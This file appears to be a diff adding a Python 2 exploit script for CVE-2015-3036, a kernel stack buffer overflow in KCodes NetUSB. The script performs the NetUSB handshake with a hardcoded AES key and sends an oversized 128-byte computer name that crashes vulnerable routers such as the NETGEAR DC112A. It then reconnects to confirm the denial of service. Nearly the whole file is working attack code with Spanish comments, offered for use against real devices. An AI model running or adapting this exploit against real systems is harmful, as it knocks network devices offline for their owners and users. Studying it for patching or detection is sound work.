@@ -1,0 +1,110 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Exploit Title: NetUSB Kernel Stack Buffer Overflow
+# Date: 9/10/15
+# Exploit Author: Adrian Ruiz Bermudo
+# Vendor Homepage: http://www.kcodes.com/
+# Version: Multiple: https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20150519-0_KCodes_NetUSB_Kernel_Stack_Buffer_Overflow_v10.txt
+# Tested on: NETGEAR DC112A
+# CVE : CVE-2015-3036
+
+import socket
+import sys
+import random
+import string
+import time
+import struct
+from Crypto.Cipher import AES #pip install pycrypto
+
+DOS_BYTES = 128	#BoF
+TIMEOUT = 5
+RECV_SIZE = 16
+PORT_DEFAULT = 20005
+
+AESKey = "\x5c\x13\x0b\x59\xd2\x62\x42\x64\x9e\xd4\x88\x38\x2d\x5e\xae\xcc"
+
+print "#"
+print "# Exploit KCodes NetUSB | Kernel Stack Buffer Overflow | Denial of Service (DoS)"
+print "# CVE-2015-3036"
+print "# Found by: Stefan Viehböck (Office Vienna) | SEC Consult Vulnerability Lab | https://www.sec-consult.com"
+print "# Exploit author: Adrián Ruiz Bermudo | @funsecurity | http://www.funsecurity.net"
+print "# Advisory: https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20150519-0_KCodes_NetUSB_Kernel_Stack_Buffer_Overflow_v10.txt"
+print "#"
+print ""
+
+if len(sys.argv) >= 2:
+	try:
+		target = sys.argv[1]
+		try:
+			port = int(sys.argv[2])
+		except Exception as detail:
+			port = PORT_DEFAULT
+		
+		#Inicialización de la conexión.
+		init = "\x56\x05"
+		#Datos aleatorios para el handshake
+		randomData = "".join(random.choice(string.lowercase) for i in range(RECV_SIZE))
+		#Nombre del equipo con 128 carácteres para provocar DoS.
+		computerName = "".join(random.choice(string.lowercase) for i in range(DOS_BYTES))
+		#Longitud del nombre del equipo - "\x80\x00\x00\x00"
+		lengthComputerName = struct.pack("i", DOS_BYTES);
+		#Sync - "\x07\x00\x00\x00"
+		syncOK = struct.pack("i", 7);
+		#Finalización de la conexión.
+		end = "\x01"
+
+		encryption_suite = AES.new(AESKey, AES.MODE_ECB, "")
+		randomDataCrypt1 = encryption_suite.encrypt(randomData)
+
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		sock.settimeout(TIMEOUT)
+
+		print "Conectando:", target,":",port
+		sock.connect((target, port))
+		print "Conectado"
+		print "----------------"
+
+		print "Inicializando:", init.encode("hex")
+		sock.send(init)
+		print "Random data para cifrar por el servidor:", randomData.encode("hex")
+		sock.send(randomData)
+		print "----------------"
+
+		result = sock.recv(RECV_SIZE)
+		print "Random data cifrados por el servidor:", result.encode("hex")
+		print "Random data cifrados por el cliente:", randomDataCrypt1.encode("hex")
+		if (randomDataCrypt1 == result):
+			print "Handshake OK"
+			randomData = sock.recv(RECV_SIZE)
+			print "Random data a cifrar por el cliente:", randomData.encode("hex")
+			randomDataCrypt2 = encryption_suite.encrypt(randomData)
+			print "Random data cifrados por el cliente:", randomDataCrypt2.encode("hex")
+			print "----------------"
+			sock.send(randomDataCrypt2)
+			print "Tamanio del nombre del host a parear:", lengthComputerName.encode("hex")
+			sock.send(lengthComputerName)
+			print "Nombre del host a parear:", computerName.encode("hex")
+			sock.send(computerName)
+			print "----------------"
+
+			print "Sync: ", syncOK.encode("hex")
+			sock.send(syncOK)
+			if (sock.recv(RECV_SIZE) == syncOK):
+				print "Sync ok"
+				sock.send(end)
+				try:
+					#Esperamos unos segundos antes de conectar
+					time.sleep(TIMEOUT)
+					#Comprobamos si el dispositivo sigue vivo...
+					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+					sock.settimeout(TIMEOUT)
+					sock.connect((target, port))
+					print "No vulnerable"
+				except Exception as detail:
+					print "Vulnerable, exploit OK"
+			else:
+				print 'Sync error.'
+	except Exception as detail:
+		print "Error de comunicación:", detail
+else:
+	print "Usage:", sys.argv[0], "target [port]"
